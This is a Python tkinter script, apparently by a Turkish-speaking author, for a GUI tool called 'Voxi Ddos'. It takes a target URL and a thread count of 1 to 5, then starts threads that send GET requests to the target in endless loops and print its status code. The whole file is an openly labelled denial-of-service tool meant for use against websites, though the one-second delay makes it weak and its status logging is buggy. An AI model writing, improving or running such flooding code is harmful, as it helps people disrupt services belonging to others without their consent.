from tkinter import *
import tkinter
from time import sleep
import socket
from datetime import datetime
import re
import requests
from io import BytesIO
from datetime import date
from datetime import time
import random
import datetime
import time




# coding=utf-8


from tkinter import *
import tkinter
import requests
from tkinter import messagebox
from threading import Thread
def start():
    uyari = ""
    islem = ""


            

    

    try:

        
        if E1.get() and E2.get():

            target = E1.get()
            thread = E2.get()
            str_target = "{}".format(target)

            if thread == "1":
                

                def d1():

              
                   
                    try:
                        r=requests.get(str_target)
                        code = r.status_code
                        statu = ""
                        if "200" in str(code):
                            while True:
                                metin_alani.tag_configure('style',foreground='green',background="black",font=('Verdana',8,'bold'))
                                r=requests.get(str_target)
                                statu += " Target To Website Status:: {}\n".format(code)
                                metin_alani.insert(END,statu,"style")
                                sleep(1)

                        else:

                            
                            while True:
                                metin_alani.tag_configure('style',foreground='red',font=('Verdana',8,'bold'))
                               
                                r=requests.get(str_target)
                                statu += " Target To Website Status:: {}   target off[blocked]\n".format(code)
                                metin_alani.insert(END,statu,"style")
                                sleep(1)



                        


                    except:

                        error_http1 = "Lütfen Geçerli Bir Url Giriniz\nÖrnek: http://www.orneksite.com"
                        messagebox.showerror("HTTP URL HATASI",error_http1)

                t1=Thread(target = d1)
                t1.start()

            elif thread == "2":

                def d1():
                    try:
                        r=requests.get(str_target)
                        code = r.status_code
                        statu = ""
                        if "200" in str(code):
                            while True:
                                metin_alani.tag_configure('style',foreground='green',background="black",font=('Verdana',8,'bold'))
                                r=requests.get(str_target)
                                statu += " Target To Website Status:: {}\n".format(code)
                                metin_alani.insert(END,statu,"style")
                                sleep(1)

                        else:

                            
                            while True:
                                metin_alani.tag_configure('style',foreground='red',font=('Verdana',8,'bold'))
                               
                                r=requests.get(str_target)
                                statu += " Target To Website Status: {}   target off[blocked]\n".format(code)
                                metin_alani.insert(END,statu,"style")
                                sleep(1)
                    except:

                        error_http2 = "Lütfen Geçerli Bir Url Giriniz\nÖrnek: http://www.orneksite.com"
                        messagebox.showerror("HTTP URL HATASI",error_http2)

                t1=Thread(target = d1)
                t2=Thread(target = d1)

                t1.start()
                t2.start()

            elif thread == "3":

                def d1():
                    try:
                       
                        r=requests.get(str_target)
                        code = r.status_code
                        statu = ""
                        if "200" in str(code):
                            while True:
                                metin_alani.tag_configure('style',foreground='green',background="black",font=('Verdana',8,'bold'))
                                r=requests.get(str_target)
                                statu += " Target To Website Status:: {}\n".format(code)
                                metin_alani.insert(END,statu,"style")
                                sleep(1)

                        else:

                            
                            while True:
                                metin_alani.tag_configure('style',foreground='red',font=('Verdana',8,'bold'))
                               
                                r=requests.get(str_target)
                                statu += " Target To Website Status:: {}   target off[blocked]\n".format(code)
                                metin_alani.insert(END,statu,"style")
                                sleep(1)

                    except:

                        error_http2 = "Lütfen Geçerli Bir Url Giriniz\nÖrnek: http://www.orneksite.com"
                        messagebox.showerror("HTTP URL HATASI",error_http2)

                t1=Thread(target = d1)
                t2=Thread(target = d1)
                t3=Thread(target = d1)


                t1.start()
                t2.start()
                t3.start()


            elif thread == "4":

                def d1():
                    try:
                       
                        r=requests.get(str_target)
                        code = r.status_code
                        statu = ""
                        if "200" in str(code):
                            while True:
                                metin_alani.tag_configure('style',foreground='green',background="black",font=('Verdana',8,'bold'))
                                r=requests.get(str_target)
                                statu += " Target To Website Status: {}\n".format(code)
                                metin_alani.insert(END,statu,"style")
                                sleep(1)

                        else:

                            
                            while True:
                                metin_alani.tag_configure('style',foreground='red',font=('Verdana',8,'bold'))
                               
                                r=requests.get(str_target)
                                statu += " Target To Website Status: {}   target off[blocked]\n".format(code)
                                metin_alani.insert(END,statu,"style")
                                sleep(1)

                    except:

                        error_http2 = "Lütfen Geçerli Bir Url Giriniz\nÖrnek: http://www.orneksite.com"
                        messagebox.showerror("HTTP URL HATASI",error_http2)

                t1=Thread(target = d1)
                t2=Thread(target = d1)
                t3=Thread(target = d1)
                t4=Thread(target = d1)


                t1.start()
                t2.start()
                t3.start()
                t4.start()


            elif thread == "5":

                def d1():
                    try:
                       
                        r=requests.get(str_target)
                        code = r.status_code
                        statu = ""
                        if "200" in str(code):
                            while True:
                                metin_alani.tag_configure('style',foreground='green',background="black",font=('Verdana',8,'bold'))
                                r=requests.get(str_target)
                                statu += " Target To Website Status: {}\n".format(code)
                                metin_alani.insert(END,statu,"style")
                                sleep(1)

                        else:

                            
                            while True:
                                metin_alani.tag_configure('style',foreground='red',font=('Verdana',8,'bold'))
                               
                                r=requests.get(str_target)
                                statu += " Target To Website Status: {}   target off[blocked]\n".format(code)
                                metin_alani.insert(END,statu,"style")
                                sleep(1)

                    except:

                        error_http2 = "Lütfen Geçerli Bir Url Giriniz\nÖrnek: http://www.orneksite.com"
                        messagebox.showerror("HTTP URL HATASI",error_http2)

                t1=Thread(target = d1)
                t2=Thread(target = d1)
                t3=Thread(target = d1)
                t4=Thread(target = d1)
                t5=Thread(target = d1)




                t1.start()
                t2.start()
                t3.start()
                t4.start()
                t5.start()





            else:

                uyari += "5 İŞLEMDEN FAZLA DEGER GİREMEZSİNİZ! [bir sayı giriniz]"
                messagebox.showerror("işlem yükü desteklenmiyor",uyari)


        

            


            

        else:

            uyari += "Lütfen Gerekli Alanları doldurunuz."
            messagebox.showerror("Boş Alanlar Var",uyari)

        

        

    except:
       
        error = "Lütfen Geçerli Bir Url Giriniz\nÖrnek: http://www.orneksite.com"
        messagebox.showerror("hata",error)





master = Tk()
master.title("Voxi Ddos")
master.geometry("500x300+350+250")
master.resizable(False,False)


frame1 = Frame(master,bg="darkred")
frame1.place(relx=0,rely=0,relwidth=1.0,relheight=0.1)
l1 = Label(frame1,text="Voxi Ddos",fg="white",bg="darkred",font="Time 15 bold")
l1.pack(padx=2,pady=2)

#--------------------frame2 kullanıcı girdisi----------------#
#------------------------------------------------------------#

frame2 = Frame(master,bg="darkred")
frame2.place(relx=0,rely=0.12,relwidth=1.0,relheight=0.3)

L_hedef = Label(frame2,text="Target:",bg="black",fg="white",font="Time 10 bold")
L_hedef.pack(padx=5,side=LEFT)
E1 = Entry(frame2,bd=5)
E1.pack(side=LEFT)

L_thread = Label(frame2,text="Threat:",bg="black",fg="white",font="Time 10 bold")
L_thread.pack(padx=5,side=LEFT)
E2 = Entry(frame2,bd=5)
E2.pack(side=LEFT)

btn = Button(frame2,text="Start",bg="green",fg="white",font="Arial 10 bold",command=start)
btn.pack(padx=5,side=LEFT)


#--------------------frame3 terminal ekran----------------#
#------------------------------------------------------------#

frame3 = Frame(master,bg="darkred")
frame3.place(relx=0,rely=0.43,relwidth=1.0,relheight=0.57)

Label(frame3,text='Terminal:',bg='darkred',font='Verdana 8',fg='white').pack(padx=5,pady=2,anchor=NW)

metin_alani = Text(frame3,height=10,width=50,bg="black")
metin_alani.tag_configure('style',foreground='green',background="black",font=('Verdana',8,'bold'))
metin_alani.pack()


  



 


master.mainloop()
